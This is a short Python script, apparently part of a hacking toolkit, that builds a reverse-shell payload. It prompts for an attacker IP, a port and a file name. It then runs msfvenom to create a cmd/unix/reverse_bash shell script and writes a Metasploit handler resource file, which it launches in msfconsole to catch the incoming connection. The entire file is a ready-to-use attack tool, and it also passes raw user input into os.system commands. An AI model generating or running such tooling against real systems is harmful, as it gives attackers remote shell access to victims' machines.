import os

#GeerxOS on github!

def bash():
    os.system("clear")
    os.system("figlet -f banner Bash ")
    print("--> ")
    ip = input("IP: ")
    print("--> ")
    port = input("Port: ")
    print("--> ")
    name = input("Name: ")
    payload = 'cmd/unix/reverse_bash'
    format= 'raw'
    ext= '.sh'
    print("[!] Creating payload!! [!] ")
    os.system("msfvenom -p "+payload+" LHOST="+ip+" LPORT="+port+" -f "+format+" -o "+name+ext+"")
    print("Payload created!!")
    print("Running metasploit-framework!")
    os.system("echo 'use exploit/multi/handler' >> bash.rb")
    os.system("echo 'set payload "+payload+"' >> bash.rb")
    os.system("echo 'set lhost "+ip+"' >> bash.rb")
    os.system("echo 'set lport "+port+"' >> bash.rb")
    os.system("echo 'exploit' >> bash.rb")
    os.system("gnome-terminal -- msfconsole -r bash.rb &")
    input("Press enter")
    os.system("clear")